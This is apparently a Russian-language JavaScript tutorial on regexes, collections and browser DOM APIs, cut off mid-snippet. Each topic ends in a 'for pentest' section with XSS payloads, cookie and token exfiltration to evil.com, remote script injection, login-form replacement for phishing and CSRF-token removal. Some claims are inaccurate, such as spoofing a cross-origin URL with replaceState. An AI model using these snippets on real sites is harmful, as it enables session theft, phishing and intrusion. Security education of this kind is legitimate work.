const payload = '\nalert(1)\n';
/^alert/.test(payload); // false (^ в начале всей строки)
/^alert/m.test(payload); // true (^ в начале каждой строки)
```

// Методы: test, exec

```javaScript
const re = /alert\((\d+)\)/;

// test - возвращает boolean
re.test('alert(1)'); // true
re.test('xss');      // false

// exec - возвращает детальную информацию
const match = re.exec('alert(1) and alert(2)');
console.log(match);
// [
//   0: 'alert(1)',
//   1: '1',
//   index: 0,
//   input: 'alert(1) and alert(2)',
//   groups: undefined
// ]

// С флагом g можно вызывать повторно
const re2 = /alert\((\d+)\)/g;
let m;
while (m = re2.exec('alert(1) alert(2)')) {
    console.log(m[1]); // 1, потом 2
}

// ДЛЯ ПЕНТЕСТА:
// 1. Извлечение данных
const match = /token=([^&]+)/.exec(document.cookie);
if (match) {
    sendToEvil(match[1]); // кража токена
}

// 2. ReDoS через test с злым паттерном
// /(a+)+b/.test('aaaaaaaaaaaaaaaaaaaaaaaaaaaaac'); // может зависнуть!
```

// Группы, квантификаторы

```javaScript
// Квантификаторы
/a{3}/.test('aaa');   // true (ровно 3)
/a{2,4}/.test('aaa'); // true (от 2 до 4)
/a{2,}/.test('aaa');  // true (от 2 и больше)
/a*/.test('');        // true (0 или больше)
/a+/.test('a');       // true (1 или больше)
/a?/.test('');        // true (0 или 1)

// Жадные и ленивые
/<.*>/.test('<div>text</div>'); // true (жадный - все от < до последнего >)
/<.*?>/.test('<div>text</div>'); // true (ленивый - только <div>)

// Группы
const re = /(\d{4})-(\d{2})-(\d{2})/;
const m = re.exec('2024-01-15');
console.log(m[1]); // '2024'
console.log(m[2]); // '01'
console.log(m[3]); // '15'

// Именованные группы
const re2 = /(?<year>\d{4})-(?<month>\d{2})-(?<day>\d{2})/;
const m2 = re2.exec('2024-01-15');
console.log(m2.groups.year); // '2024'

// ДЛЯ ПЕНТЕСТА:
// 1. Извлечение данных через группы
const input = 'user:admin, role:admin';
const re = /role:(\w+)/;
const role = re.exec(input)[1]; // 'admin'

// 2. Обход через жадность
function sanitize(str) {
    return str.replace(/<.*>/g, ''); // удаляет теги
}
sanitize('<script>alert(1)</script>'); // все удалится
sanitize('<script>alert(1)</scrip>t'); // '<script>alert(1)</scrip>t' - не удалится!
```

// Lookahead/lookbehind

```javaScript
// Lookahead - проверка что дальше есть
/\d+(?=px)/.test('100px');   // true (число перед px)
/\d+(?!px)/.test('100em');   // true (число не перед px)

// Lookbehind - проверка что перед есть
/(?<=\$)\d+/.test('$100');   // true (число после $)
/(?<!\$)\d+/.test('100');    // true (число не после $)

// ДЛЯ ПЕНТЕСТА:
// 1. Поиск без захвата
const re = /(?<=token=)[^&]+/.exec('?id=1&token=secret&user=2');
console.log(re[0]); // 'secret' - только значение, без token=

// 2. Обход через lookaround в фильтрах
function filter(str) {
    return str.replace(/<script>/g, '');
}
// Но /<script(?=>)/ не сработает как фильтр
```

// Экранирование

```javaScript
// В regexp специальные символы: .*+?^${}()|[]\
// Их нужно экранировать \

// Экранирование точки (ищет точку, а не любой символ)
/\./.test('.'); // true
/./.test('.');  // true (но и любой символ)

// Экранирование в конструкторе
const special = '.*+?';
const re = new RegExp('\\' + special, 'g'); // нужно два слеша

// Функция для экранирования
function escapeRegExp(str) {
    return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

// ДЛЯ ПЕНТЕСТА:
// 1. Обход через неэкранированные метасимволы
const userInput = '.*';
const re = new RegExp(userInput); // любой символ 0+ раз - ReDoS риск

// 2. Инъекция в паттерн
const filter = userInput.replace(/[<>]/g, ''); // удаляет < >
// но если ввести '.*', фильтр не сработает, а regexp потом сломается
```

// Unicode свойства \p{}

```javaScript
// \p{} - юникодные категории (требует флаг u)
/\p{Letter}/u.test('A');        // true (буква)
/\p{Number}/u.test('5');        // true (цифра)
/\p{Script=Cyrillic}/u.test('П'); // true (кириллица)

// Категории
/\p{L}/u;  // любая буква
/\p{N}/u;  // любая цифра
/\p{P}/u;  // пунктуация
/\p{S}/u;  // символы (валюты и т.д.)

// ДЛЯ ПЕНТЕСТА:
// 1. Обход фильтров через юникод
function isAscii(str) {
    return /^[\x00-\x7F]+$/.test(str); // только ascii
}
isAscii('А'); // false - не ascii
// Можно внедрить юникод-символы, похожие на ascii

// 2. Обнаружение языка для fingerprint
/\p{Script=Latin}/u.test(userInput); // латиница
/\p{Script=Cyrillic}/u.test(userInput); // кириллица
```


### 3.7 Map, Set, WeakMap, WeakSet



// Map vs Object

```javaScript
// Map - ключи любые типы, сохраняет порядок
const map = new Map();
map.set('name', 'Alice');
map.set(42, 'answer');
map.set({x:1}, 'object key');

// Object - ключи только строки/Symbol
const obj = {};
obj['name'] = 'Alice';
obj[42] = 'answer'; // ключ станет строкой '42'

// Различия
console.log(map.size);       // 3
console.log(Object.keys(obj).length); // 2

// Итерация
map.forEach((value, key) => console.log(key, value));
for (let [key, value] of map) {
    console.log(key, value);
}

// Object итерация через Object.entries

// ДЛЯ ПЕНТЕСТА:
// 1. Map с ключами-объектами для хранения данных
const cache = new Map();
const user = {name: 'admin'};
cache.set(user, 'secret token');
// позже можно получить по той же ссылке

// 2. Обход через ключи-объекты
function checkRole(user) {
    return roleMap.get(user) === 'admin';
}
// если подменить объект, можно обойти
```

// Set (уникальные значения)

```javaScript
// Set - коллекция уникальных значений
const set = new Set([1, 2, 3, 2, 1]);
console.log(set); // Set {1, 2, 3}
console.log(set.size); // 3

// Методы
set.add(4);
set.has(2); // true
set.delete(1);
set.clear();

// Итерация
set.forEach(val => console.log(val));
for (let val of set) {
    console.log(val);
}

// ДЛЯ ПЕНТЕСТА:
// 1. Дедупликация payload'ов
const payloads = new Set();
payloads.add('<script>alert(1)</script>');
payloads.add('<script>alert(1)</script>'); // не добавится

// 2. Быстрая проверка наличия
const blacklist = new Set(['<script>', 'javascript:', 'onerror=']);
if (blacklist.has(userInput)) {
    return 'blocked';
}
// Но обход через варианты: <SCRIPT> не попадёт
```

// WeakMap (ключи-объекты, GC)

```javaScript
// WeakMap - ключи ТОЛЬКО объекты, слабые ссылки
const wm = new WeakMap();
let obj = {id: 1};
wm.set(obj, 'secret data');
console.log(wm.get(obj)); // 'secret data'

// Если obj удаляется, запись автоматически удаляется из WeakMap
obj = null; // GC может удалить запись

// Особенности:
// - Нет свойства size
// - Не итерируется
// - Ключи только объекты

// ДЛЯ ПЕНТЕСТА:
// 1. Приватные данные без утечек
const secrets = new WeakMap();
class User {
    constructor(name) {
        secrets.set(this, { token: 'secret' });
    }
    getToken() {
        return secrets.get(this).token;
    }
}
// secrets не доступен извне

// 2. Утечка памяти предотвращена
const cache = new WeakMap();
function process(obj) {
    if (!cache.has(obj)) {
        cache.set(obj, expensiveComputation(obj));
    }
    return cache.get(obj);
}
// Когда obj удалится, кеш очистится
```

// WeakSet

```javaScript
// WeakSet - только объекты, слабые ссылки
const ws = new WeakSet();
let obj1 = {id: 1};
let obj2 = {id: 2};

ws.add(obj1);
ws.add(obj2);

console.log(ws.has(obj1)); // true

obj1 = null; // GC может удалить

// ДЛЯ ПЕНТЕСТА:
// 1. Маркировка объектов без утечек
const processed = new WeakSet();
function process(obj) {
    if (processed.has(obj)) {
        return; // уже обработали
    }
    processed.add(obj);
    // обработка
}

// 2. Отслеживание живых объектов
const liveObjects = new WeakSet();
// полезно для отладки
```

// Итерация

```javaScript
const map = new Map([['a',1], ['b',2], ['c',3]]);
const set = new Set([1,2,3,4,5]);

// for...of
for (let [key, val] of map) {
    console.log(key, val);
}

for (let val of set) {
    console.log(val);
}

// keys(), values(), entries()
for (let key of map.keys()) {
    console.log(key);
}

for (let val of map.values()) {
    console.log(val);
}

for (let [key, val] of map.entries()) {
    console.log(key, val);
}

// forEach
map.forEach((val, key) => console.log(key, val));
set.forEach(val => console.log(val));

// ДЛЯ ПЕНТЕСТА:
// 1. Конвертация в массив для обхода
const arr = Array.from(map.entries()); // [[key,val], ...]
const values = Array.from(set.values()); // [1,2,3,4,5]

// 2. Обход через итераторы
const iter = map[Symbol.iterator]();
let item;
while (!(item = iter.next()).done) {
    console.log(item.value); // [key, val]
}
```

// Производительность

```javaScript
// Map/Set быстрее для частых операций с ключами
// Object лучше для простых структур

// Поиск: Map.get O(1) vs Object.property O(1)
// Удаление: Map.delete O(1) vs delete obj.prop медленнее

// ДЛЯ ПЕНТЕСТА:
// 1. DoS через большое количество ключей
const bigMap = new Map();
for (let i = 0; i < 1e6; i++) {
    bigMap.set(i, 'value');
}
// потребление памяти

// 2. Обход через слабые коллекции для скрытия данных
// WeakMap/WeakSet не видны в инспекторе памяти так же легко
```



---

## **БЛОК 4: BROWSER API (СВЯТАЯ ТРОИЦА ДЛЯ XSS)**

### 4.1 Window объект



// Глобальные переменные

```javaScript
// В браузере глобальные переменные становятся свойствами window
var xss = 'payload';
console.log(window.xss); // 'payload'

// let/const на верхнем уровне тоже (но не удаляются)
let y = 10;
console.log(window.y); // undefined (в модулях), но в глобальном - есть!

// Любое объявление var/function глобально
function hack() { return 1; }
window.hack(); // работает

// ДЛЯ ПЕНТЕСТА:
// 1. Переопределение глобальных функций
window.alert = function(msg) {
    console.log('перехватили: ' + msg);
}; // все alert пойдут сюда

// 2. Доступ к любым глобальным объектам
window['document']; // document
window['eval']('alert(1)'); // eval через строку

// 3. Обход через window без точек
const prop = 'alert';
window[prop](1); // alert(1) - динамический вызов!
```

// window vs globalThis

```javaScript
// window - глобальный объект в браузере
window.alert('hello');

// globalThis - универсальный способ (везде)
globalThis.alert('hello'); // в браузере то же что window

// В worker'ах нет window, но есть self
// В Node нет window, есть global

// ДЛЯ ПЕНТЕСТА:
// 1. Кросс-средовой код
function getGlobal() {
    return globalThis; // работает везде
}

// 2. Проверка на браузер
if (typeof window !== 'undefined') {
    // мы в браузере
}
```

// location (href, hash, search)

```javaScript
// location - информация о URL
location.href;      // полный URL
location.protocol;  // 'https:'
location.host;      // 'example.com:8080'
location.hostname;  // 'example.com'
location.port;      // '8080'
location.pathname;  // '/path/page.html'
location.search;    // '?id=123&name=test'
location.hash;      // '#section'
location.origin;    // 'https://example.com'

// Изменение location
location.href = 'https://evil.com'; // переходим
location.assign('https://evil.com'); // то же
location.replace('https://evil.com'); // переходим без записи в историю
location.reload(); // перезагрузка

// ДЛЯ ПЕНТЕСТА: ЭТО ЗОЛОТАЯ ЖИЛА!
// 1. Получение параметров из URL
const params = new URLSearchParams(location.search);
const token = params.get('token'); // украли токен из URL

// 2. XSS через hash (DOM-based)
// URL: http://site.com/page#<script>alert(1)</script>
const hash = location.hash.substring(1); // убираем #
document.body.innerHTML = hash; // XSS!

// 3. Кража данных через редирект
window.location = 'https://evil.com/steal?cookie=' + document.cookie;

// 4. Обход через location.hash для хранения payload
// payload в hash не отправляется на сервер, только на клиенте
```

// history (pushState, replaceState)

```javaScript
// history - управление историей браузера
history.length; // количество записей
history.back(); // назад
history.forward(); // вперед
history.go(-2); // на 2 шага назад

// pushState - добавляет запись в историю (без перезагрузки)
history.pushState({page: 1}, 'title', '/page1');
history.pushState({page: 2}, 'title', '/page2?xss=payload');

// replaceState - заменяет текущую запись
history.replaceState({}, '', '/new-url');

// Событие popstate (при навигации назад/вперед)
window.addEventListener('popstate', (e) => {
    console.log('state:', e.state); // данные из pushState
});

// ДЛЯ ПЕНТЕСТА:
// 1. Изменение URL без перезагрузки (спуфинг)
history.replaceState({}, '', 'https://bank.com/login'); // подмена URL в адресной строке!

// 2. Сохранение состояния с вредоносными данными
history.pushState({xss: '<script>alert(1)</script>'}, '', '');

// 3. Обход через state в popstate
window.addEventListener('popstate', (e) => {
    if (e.state && e.state.xss) {
        document.body.innerHTML = e.state.xss; // XSS!
    }
});
```

// navigator (userAgent, platform, cookiesEnabled)

```javaScript
// navigator - информация о браузере и системе
navigator.userAgent;      // строка браузера (Mozilla/5.0...)
navigator.platform;       // 'Win32', 'MacIntel', 'Linux x86_64'
navigator.language;       // 'ru-RU', 'en-US'
navigator.languages;      // ['ru-RU', 'ru', 'en']
navigator.cookieEnabled;  // true/false
navigator.doNotTrack;     // '1' если DNT включен
navigator.onLine;         // true если есть соединение

// Информация о железе
navigator.hardwareConcurrency; // количество ядер CPU
navigator.deviceMemory;        // память (GB)
navigator.maxTouchPoints;      // тач-точек

// WebGL для fingerprint
const canvas = document.createElement('canvas');
const gl = canvas.getContext('webgl');
const renderer = gl.getParameter(gl.RENDERER); // видеокарта

// ДЛЯ ПЕНТЕСТА:
// 1. Fingerprinting - идентификация пользователя
const fingerprint = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    cores: navigator.hardwareConcurrency,
    memory: navigator.deviceMemory,
    timezone: new Date().getTimezoneOffset()
};
fetch('https://evil.com/fp', {method: 'POST', body: JSON.stringify(fingerprint)});

// 2. Проверка на куки
if (!navigator.cookieEnabled) {
    // использовать localStorage или другие методы
}

// 3. Обнаружение мобильных устройств
const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
```

// screen (width, height)

```javaScript
// screen - информация об экране
screen.width;          // ширина экрана (например, 1920)
screen.height;         // высота экрана (1080)
screen.availWidth;     // доступная ширина (без панелей)
screen.availHeight;    // доступная высота
screen.colorDepth;     // глубина цвета (24, 32)
screen.pixelDepth;     // то же что colorDepth
screen.orientation;    // ориентация экрана

// ДЛЯ ПЕНТЕСТА:
// 1. Fingerprinting размеров экрана
const screenInfo = {
    width: screen.width,
    height: screen.height,
    colorDepth: screen.colorDepth
};

// 2. Обнаружение виртуалок/ботов
if (screen.width === 1024 && screen.height === 768) {
    // подозрительно стандартный размер
}

// 3. Адаптация эксплойта под размер
if (screen.width < 768) {
    // мобильная версия
}
```

// frames, self, parent, top

```javaScript
// frames - коллекция фреймов
window.frames[0];      // первый iframe
window.frames['name']; // iframe по имени

// self - текущее окно
window.self === window; // true

// parent - родительское окно (если во фрейме)
// top - самое верхнее окно (за пределами всех фреймов)

// Пример в iframe
if (window !== window.top) {
    console.log('я во фрейме');
    window.top.location = 'https://evil.com'; // меняем верхнее окно
}

// ДЛЯ ПЕНТЕСТА:
// 1. Frame busting - защита от кликджекинга
if (top != self) {
    top.location = self.location; // выход из фрейма
}

// 2. Обход frame busting
// Можно через sandbox или другие методы

// 3. Коммуникация между фреймами
// parent.postMessage('data', '*'); // отправка данных наверх
```

// opener

```javaScript
// opener - ссылка на окно, которое открыло текущее
// при window.open() или target="_blank"

// Страница A открывает страницу B
// В B: window.opener ссылается на A

// ДЛЯ ПЕНТЕСТА:
// 1. Атака на открывающее окно
if (window.opener) {
    // Меняем location открывшего окна
    window.opener.location = 'https://evil.com/phishing';
}

// 2. Кража данных из открывшего окна
try {
    const token = window.opener.document.cookie;
    fetch('https://evil.com/steal?t=' + token);
} catch(e) {
    // SOP может блокировать
}

// 3. Защита: rel="noopener" в ссылках
// <a href="..." target="_blank" rel="noopener">
```

// closed

```javaScript
// closed - проверяет, закрыто ли окно
const newWin = window.open('https://example.com');
console.log(newWin.closed); // false

// позже
if (newWin.closed) {
    console.log('окно закрыто');
}

// ДЛЯ ПЕНТЕСТА:
// 1. Проверка на закрытие для повторного открытия
if (popup && popup.closed) {
    popup = window.open('https://evil.com');
}

// 2. Обход через закрытие окон
window.close(); // закрыть текущее окно (если разрешено)
```

// defaultStatus, status

```javaScript
// defaultStatus - статусная строка (устарело, в современных браузерах не работает)
window.defaultStatus = 'готов к взлому';

// status - то же
window.status = 'привет';

// ДЛЯ ПЕНТЕСТА:
// Бесполезно, но знать надо - в старых IE работало
```



### 4.2 Document объект - БИБЛИЯ



// DOM дерево

```javaScript
// document - точка входа в DOM
document.documentElement; // <html>
document.head;            // <head>
document.body;            // <body>
document.title;           // заголовок страницы
document.forms;           // все формы
document.images;          // все изображения
document.links;           // все ссылки
document.scripts;         // все скрипты
document.styleSheets;     // все стили

// ДЛЯ ПЕНТЕСТА:
// 1. Сбор информации о странице
Array.from(document.scripts).forEach(s => {
    console.log(s.src, s.innerHTML); // анализ скриптов
});

// 2. Поиск элементов
const inputs = document.querySelectorAll('input[type="password"]');
inputs.forEach(i => console.log(i.value)); // кража паролей!
```

// Методы поиска: getElementById, querySelector, getElementsBy*

```javaScript
// По ID (быстро)
document.getElementById('main'); // один элемент

// По классу (коллекция)
document.getElementsByClassName('item'); // HTMLCollection

// По тегу
document.getElementsByTagName('div'); // все div

// По name
document.getElementsByName('username'); // по атрибуту name

// querySelector - CSS селекторы (первый)
document.querySelector('#main .item:first-child');

// querySelectorAll - все
document.querySelectorAll('div[data-xss]'); // NodeList

// ДЛЯ ПЕНТЕСТА:
// 1. Поиск уязвимых элементов
const forms = document.querySelectorAll('form[action^="http://"]'); // не HTTPS

// 2. Кража данных из скрытых полей
const csrf = document.querySelector('input[name="csrf"]').value;

// 3. Обход через getElementsBy* - живые коллекции!
const items = document.getElementsByClassName('item');
// items обновляется автоматически при изменении DOM
```

// Навигация: parentNode, childNodes, firstChild, lastChild, nextSibling

```javaScript
const el = document.getElementById('test');

el.parentNode;           // родитель
el.childNodes;           // все дети (включая текстовые узлы)
el.children;             // только элементы-дети
el.firstChild;           // первый ребенок (может быть текст)
el.firstElementChild;    // первый элемент-ребенок
el.lastChild;            // последний ребенок
el.lastElementChild;     // последний элемент-ребенок
el.nextSibling;          // следующий сосед (может быть текст)
el.nextElementSibling;   // следующий элемент-сосед
el.previousSibling;      // предыдущий сосед
el.previousElementSibling; // предыдущий элемент-сосед

// ДЛЯ ПЕНТЕСТА:
// 1. Путешествие по DOM для обхода
const input = document.querySelector('input[name="token"]');
const form = input.closest('form'); // ближайшая форма
form.action = 'https://evil.com'; // подмена action формы!

// 2. Поиск чувствительных данных
let el = document.body;
while (el) {
    if (el.innerText && el.innerText.includes('password')) {
        console.log('нашел!', el);
    }
    el = el.nextElementSibling;
}
```

// Свойства: body, head, title, cookie, domain, URL, referrer

```javaScript
document.body;        // <body>
document.head;        // <head>
document.title;       // заголовок
document.cookie;      // куки (строка)
document.domain;      // домен (можно менять)
document.URL;         // полный URL
document.documentURI; // то же что URL
document.referrer;    // откуда пришли
document.characterSet; // кодировка
document.lastModified; // дата последнего изменения

// ДЛЯ ПЕНТЕСТА: КРИТИЧЕСКИ ВАЖНО!
// 1. Кража кук
fetch('https://evil.com/steal', {
    method: 'POST',
    body: document.cookie
});

// 2. Изменение domain для кросс-доменного доступа
document.domain = 'example.com'; // если основной домен example.com

// 3. Информация о реферере
if (document.referrer.includes('admin-panel')) {
    // мы пришли с админки
}

// 4. Подмена document.cookie через XSS
document.cookie = "session=hacked; path=/"; // устанавливаем свою куку
```

// Создание: createElement, createTextNode, createComment

```javaScript
// Создание элементов
const div = document.createElement('div');
const text = document.createTextNode('hello');
const comment = document.createComment('XSS here');

// Установка атрибутов
div.id = 'xss';
div.className = 'payload';
div.setAttribute('data-xss', 'yes');

// Добавление текста
div.appendChild(text);

// ДЛЯ ПЕНТЕСТА:
// 1. Создание вредоносных элементов
const script = document.createElement('script');
script.src = 'https://evil.com/xss.js';
document.body.appendChild(script); // загрузка внешнего скрипта!

// 2. Создание iframe для кражи
const iframe = document.createElement('iframe');
iframe.src = 'https://target.com/admin';
iframe.onload = () => {
    // пытаемся получить содержимое (SOP мешает)
};
document.body.appendChild(iframe);

// 3. Создание img с onerror
const img = document.createElement('img');
img.setAttribute('src', 'x');
img.setAttribute('onerror', 'alert(1)');
document.body.appendChild(img); // XSS!
```

// Модификация: appendChild, insertBefore, replaceChild, removeChild

```javaScript
const parent = document.getElementById('container');
const newEl = document.createElement('div');
const refEl = document.getElementById('reference');

// Добавить в конец
parent.appendChild(newEl);

// Вставить перед reference
parent.insertBefore(newEl, refEl);

// Заменить
parent.replaceChild(newEl, oldEl);

// Удалить
parent.removeChild(oldEl);

// Современные методы
newEl.remove(); // удалить сам элемент
refEl.before(newEl); // вставить перед
refEl.after(newEl);  // вставить после
refEl.replaceWith(newEl); // заменить

// ДЛЯ ПЕНТЕСТА:
// 1. Подмена контента
const loginForm = document.getElementById('login-form');
const fakeForm = document.createElement('form');
fakeForm.innerHTML = '<input name="username"><input name="password" type="password">';
fakeForm.action = 'https://evil.com/steal';
loginForm.parentNode.replaceChild(fakeForm, loginForm); // фишинг!

// 2. Удаление защитных элементов
const csrfInput = document.querySelector('input[name="csrf"]');
csrfInput.remove(); // удалили CSRF-токен!

// 3. Вставка перед критическим элементом
const submit = document.getElementById('submit');
const hidden = document.createElement('input');
hidden.type = 'hidden';
hidden.name = 'admin';
hidden.value = 'true';
submit.before(hidden); // добавили параметр перед отправкой
```

// innerHTML vs outerHTML vs textContent (ОПАСНОСТЬ!)

```javaScript
const div = document.getElementById('test');

// innerHTML - парсит HTML (ОПАСНО!)
div.innerHTML = '<script>alert(1)</script>'; // НЕ выполнится (кроме старых IE)
div.innerHTML = '<img src=x onerror=alert(1)>'; // XSS! onerror сработает!

// outerHTML - заменяет сам элемент
div.outerHTML = '<div class="hacked">XSS</div>'; // div заменяется новым

// textContent - только текст (безопасно)
div.textContent = '<script>alert(1)</script>'; // текст, не выполнится

// innerText - похож на textContent, но с учетом стилей
div.innerText = 'text'; // не видит скрытые элементы

// ДЛЯ ПЕНТЕСТА: ЭТО СВЯТАЯ ТРОИЦА XSS!
// 1. XSS через innerHTML с событиями
element.innerHTML = '<svg/onload=alert(1)>'; // XSS!

// 2. Обход через outerHTML (элемент самоуничтожается)
element.outerHTML = '<img src=x onerror=alert(1)>'; // XSS!

// 3. Обход через вложенные теги
element.innerHTML = '<noscript><img src=x onerror=alert(1)></noscript>'; // может сработать

// 4. Проверка на наличие XSS
function isXSS(str) {
    return str.includes('<script>') || str.includes('onerror');
}
// Обход: <img src=x onerror=alert(1)> - onerror есть, но фильтр может пропустить
```

// insertAdjacentHTML

```javaScript
// Вставляет HTML в указанную позицию
element.insertAdjacentHTML('beforebegin', '<div>перед</div>');
element.insertAdjacentHTML('afterbegin', '<div>внутри в начало</div>');
element.insertAdjacentHTML('beforeend', '<div>внутри в конец</div>');
element.insertAdjacentHTML('afterend', '<div>после</div>');

// ДЛЯ ПЕНТЕСТА:
// 1. XSS через insertAdjacentHTML (как innerHTML)
element.insertAdjacentHTML('beforeend', '<img src=x onerror=alert(1)>'); // XSS!

// 2. Вставка скрипта (не сработает, но можно через события)
element.insertAdjacentHTML('beforeend', '<script>alert(1)</script>'); // не выполнится
```

// write, writeln  СТАРЬЕ, НО РАБОТАЕТ

```javaScript
// document.write - пишет прямо в поток документа
document.write('<h1>заголовок</h1>');

// Если вызвать после загрузки - перезапишет всю страницу!
window.onload = function() {
    document.write('все пропало'); // страница очистится!
};

// writeln - с переводом строки
document.writeln('строка\n');

// ДЛЯ ПЕНТЕСТА: ЭТО КЛАССИКА!
// 1. XSS через document.write
document.write('<img src=x onerror=alert(1)>'); // XSS!

// 2. Перезапись страницы для фишинга
document.write(`
    <html>
        <body>
            <h1>Введите пароль</h1>
            <input type="password" name="pass">
            <button>OK</button>
        </body>
    </html>
`); // полный фишинг!

// 3. Обход через write после загрузки
setTimeout(() => {
    document.write('<script>alert(1)</script>'); // перезапишет страницу и выполнит
}, 1000);
```

// execCommand = устарело

```javaScript
// execCommand - команды для редактирования (устарело, не везде работает)
document.execCommand('bold'); // жирный текст
document.execCommand('copy'); // копировать

// ДЛЯ ПЕНТЕСТА:
// Мало полезно, но можно попытаться скопировать данные
document.execCommand('copy'); // скопировать выделенное
```

// designMode

```javaScript
// designMode - делает документ редактируемым
document.designMode = 'on'; // теперь можно редактировать прямо на странице!

// ДЛЯ ПЕНТЕСТА:
// 1. Позволяет пользователю редактировать страницу
document.designMode = 'on'; // весь контент можно менять

// 2. Можно использовать для deface
document.designMode = 'on';
// пользователь может удалить контент
```

// contentEditable

```javaScript
// contentEditable - делает элемент редактируемым
element.contentEditable = 'true'; // можно редактировать
element.contentEditable = 'false'; // нельзя
element.isContentEditable; // true/false

// ДЛЯ ПЕНТЕСТА:
// 1. Разрешить редактирование чувствительных элементов
document.querySelector('.price').contentEditable = 'true'; // можно менять цену!

// 2. Внедрение через редактирование
// если пользователь может редактировать, может вставить XSS
```

// hidden

```javaScript
// hidden - скрывает элемент
element.hidden = true; // элемент не виден
element.hidden = false; // виден

// ДЛЯ ПЕНТЕСТА:
// 1. Показать скрытые поля
document.querySelectorAll('[hidden]').forEach(el => {
    el.hidden = false; // показываем скрытое
    console.log(el.value); // могут быть данные
});

// 2. Скрыть защитные элементы
document.getElementById('security-warning').hidden = true; // убрали предупреждение
```


**Для пентеста:** 90% XSS тутА!

### 4.3 Element



// Атрибуты: getAttribute, setAttribute, removeAttribute, hasAttribute

```javaScript
const el = document.getElementById('test');

// Получение атрибута
el.getAttribute('id'); // 'test'
el.getAttribute('data-xss'); // null если нет

// Установка
el.setAttribute('data-payload', '<script>alert(1)</script>');
el.setAttribute('onclick', 'alert(1)'); // XSS!

// Проверка
el.hasAttribute('onclick'); // true

// Удаление
el.removeAttribute('onclick'); // убрали обработчик

// ДЛЯ ПЕНТЕСТА:
// 1. Добавление событий через setAttribute
img.setAttribute('onerror', 'alert(1)'); // XSS!

// 2. Обход фильтров через setAttribute
// Фильтр проверяет innerHTML, но не видит setAttribute
element.setAttribute('src', 'x');
element.setAttribute('onerror', 'alert(1)');
document.body.appendChild(element); // XSS!

// 3. Чтение чувствительных атрибутов
const csrf = document.querySelector('meta[name="csrf-token"]');
const token = csrf.getAttribute('content'); // украли CSRF
```

// dataset (data-* атрибуты)

```javaScript
// data-* атрибуты доступны через dataset
<div id="user" data-id="123" data-role="admin" data-user-name="John"></div>

const user = document.getElementById('user');
console.log(user.dataset.id); // '123'
console.log(user.dataset.role); // 'admin'
console.log(user.dataset.userName); // 'John' (camelCase)

// Установка
user.dataset.xss = 'payload'; // добавит data-xss="payload"

// ДЛЯ ПЕНТЕСТА:
// 1. Хранение payload в данных
element.dataset.payload = '<img src=x onerror=alert(1)>';
// позже где-то используется innerHTML с этим data-атрибутом

// 2. Чтение данных приложения
const items = document.querySelectorAll('[data-sensitive]');
items.forEach(item => {
    sendToEvil(item.dataset.sensitive);
});

// 3. Обход через dataset для передачи параметров
<button data-cmd="alert(1)" onclick="eval(this.dataset.cmd)">XSS</button>
```

// classList (add, remove, toggle, contains)
ё
```javaScript
const el = document.getElementById('test');

// Добавление класса
el.classList.add('active', 'visible');

// Удаление
el.classList.remove('hidden');

// Переключение
el.classList.toggle('selected');

// Проверка
el.classList.contains('active'); // true

// Замена
el.classList.replace('old', 'new');

// ДЛЯ ПЕНТЕСТА:
// 1. Обход через классы
// Иногда классы используются в селекторах для логики
if (el.classList.contains('admin')) {
    // показать админ-панель
}
el.classList.add('admin'); // добавили себе класс!

// 2. Стилизация для эксфильтрации
el.classList.add('steal-data'); // может триггерить CSS-эксплойты
```

// style (CSS-in-JS)

```javaScript
// Инлайн-стили
el.style.color = 'red';
el.style.backgroundColor = 'black';
el.style['font-size'] = '16px'; // или camelCase: fontSize
el.style.cssText = 'color: red; background: black;';

// Получение вычисленных стилей
const styles = window.getComputedStyle(el);
console.log(styles.getPropertyValue('color'));

// ДЛЯ ПЕНТЕСТА:
// 1. Обфускация через стили
el.style.backgroundImage = 'url("https://evil.com/steal?data=" + document.cookie)';
// CSS может делать запросы!

// 2. Скрытие/показ элементов
el.style.display = 'none'; // спрятали
el.style.visibility = 'hidden'; // тоже спрятали

// 3. CSS-инъекции
el.style.cssText = 'width: expression(alert(1))'; // старые IE
```

// clientWidth, clientHeight, scrollWidth, scrollHeight

```javaScript
// client - видимая область (без прокрутки, с padding)
el.clientWidth;  // ширина внутри + padding
el.clientHeight; // высота внутри + padding

// scroll - полный размер с прокруткой
el.scrollWidth;  // полная ширина контента
el.scrollHeight; // полная высота контента

// ДЛЯ ПЕНТЕСТА:
// 1. Обнаружение скрытого контента
if (el.scrollHeight > el.clientHeight) {
    // есть прокрутка - значит есть скрытый контент
}

// 2. Fingerprinting через размеры
const dimensions = {
    clientWidth: el.clientWidth,
    clientHeight: el.clientHeight
};
```

// offsetWidth, offsetHeight, offsetParent

```javaScript
// offset - включает рамку и скролл
el.offsetWidth;   // полная ширина с рамкой
el.offsetHeight;  // полная высота с рамкой
el.offsetParent;  // ближайший позиционированный родитель
el.offsetLeft;    // расстояние до offsetParent
el.offsetTop;     // расстояние до offsetParent

// ДЛЯ ПЕНТЕСТА:
// 1. Определение позиции для кликджекинга
const rect = {
    left: el.offsetLeft,
    top: el.offsetTop,
    width: el.offsetWidth,
    height: el.offsetHeight
};
// можно наложить iframe поверх

// 2. Обнаружение элементов вне экрана
if (el.offsetTop < window.scrollY) {
    // элемент выше видимой области
}
```

// getBoundingClientRect

```javaScript
// Возвращает координаты элемента относительно viewport
const rect = el.getBoundingClientRect();
console.log({
    top: rect.top,      // от верха окна
    right: rect.right,
    bottom: rect.bottom,
    left: rect.left,
    width: rect.width,
    height: rect.height,
    x: rect.x,
    y: rect.y
});

// ДЛЯ ПЕНТЕСТА:
// 1. Точное позиционирование для атак
const target = document.getElementById('submit-btn');
const rect = target.getBoundingClientRect();
// можно кликнуть в нужное место
window.scrollTo(rect.left, rect.top);

// 2. Проверка видимости
if (rect.top >= 0 && rect.bottom <= window.innerHeight) {
    console.log('элемент видим');
}

// 3. Определение координат для кликджекинга
const iframe = document.createElement('iframe');
iframe.style.position = 'absolute';
iframe.style.left = rect.left + 'px';
iframe.style.top = rect.top + 'px';
```

// matches, closest

```javaScript
// matches - проверяет соответствует ли селектору
el.matches('.item.active'); // true/false

// closest - ищет ближайшего родителя по селектору (включая себя)
const form = el.closest('form'); // найти родительскую форму
const item = el.closest('.item'); // найти ближайший элемент с классом item

// ДЛЯ ПЕНТЕСТА:
// 1. Поиск контекста
if (el.closest('.admin-panel')) {
    console.log('мы в админке');
}

// 2. Проверка перед атакой
if (el.matches('input[type="password"]')) {
